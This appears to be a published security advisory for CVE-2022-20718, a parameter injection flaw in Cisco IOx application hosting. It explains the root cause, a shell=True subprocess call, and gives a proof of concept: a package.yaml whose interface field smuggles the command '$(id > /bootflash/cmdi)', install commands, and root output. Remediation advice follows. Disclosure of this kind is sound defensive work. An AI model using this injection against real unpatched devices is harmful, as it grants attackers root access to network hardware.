# Cisco IOx - Application Hosting Environment Parameter Injection Vulnerability (CVE-2022-20718)

Moderate

[orange-cert-cc](/orange-cert-cc)
published
GHSA-px2c-q384-5wxc
Apr 19, 2022

## Package

IOx
(Cisco)

## Affected versions

17.6.1
17.3.3

## Patched versions

17.6(2)
17.7(1)

## Description

### Overview

Cisco provides an API for IOX. Through this API we can install apps.

### Impact

While installing a crafted app an authenticated user can gain unrestricted root execution on Linux host.

### Details

App installation require a valid tar archive. This tar require a "package.yaml" file that describes the app.

The interface field of "package.yaml" is taken without any validation to setup the network by Cisco Application Framework (CAF).

This field is append to an array for the command but at the end this array is concatenated and sent to a shell.

Pseudo code

```
[...]
cmd.append(intf)
[...]
subprocess.check_output((' ').join(cmd), stderr=subprocess.STDOUT, shell=True

```

Shell within interface field will be interpreted.

### Tested versions

This vulnerability have been tested on Cisco ISR4200.

```
NR-4221-3#show version
Cisco IOS XE Software, Version 17.03.02
Cisco IOS Software [Amsterdam], ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9_IAS-M), Version 17.3.2, RELEASE SOFTWARE (fc3)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2020 by Cisco Systems, Inc.
Compiled Sat 31-Oct-20 13:21 by mcpre

```
### Proof of Concept

Prerequisite: enable iox and an app (guestshell for instance)

```
# show run
iox
...
app-hosting appid guestshell
 app-vnic management guest-interface 0
...

```

Then in create the following "package.yaml" file:

```
descriptor-schema-version: "2.8"
info:
  name: GuestShell
  description: "Hacked Cisco Systems Guest Shell XE for x86_64"
  version: "3.1.1"
  author-link: "http://www.cisco.com"
  author-name: "Cisco Systems"

app:
  type: lxc
  cpuarch: "x86_64"
  kernel-version: "4.19.88"
  env:
    GUESTSHELL: yes

  system-capabilities:
    net_admin: on

  resources:
    profile: custom
    cpu: 800
    memory: 256
    disk: 1
    network:
      - interface-name: eth0$(id > /bootflash/cmdi)

# Specify runtime and startup
  startup:
    rootfs: min.ext2
    target: /sbin/init

```

Then rebuild the app (here we took guestshell.tar):

```
./ioxclient application stop guestshell
./ioxclient application deactivate guestshell
rm guestshell.tar
./ioxclient package -n guestshell --skip-signing .
./ioxclient application uninstall guestshell
./ioxclient application install guestshell guestshell.tar
./ioxclient application activate guestshell

```

The result can see here:

```
NR-4221-3#term shell
NR-4221-3#cat bootflash:cmdi
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:polaris_caf_t:s0

```
### Solution

#### Recommandations sent to PSIRT

We suggest to:

* apply user input validation
* do not use shell=True on subprocess calls

#### Security patch

Upgrade to patched version (see above).

#### Workaround

There are no workarounds that address this vulnerability.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
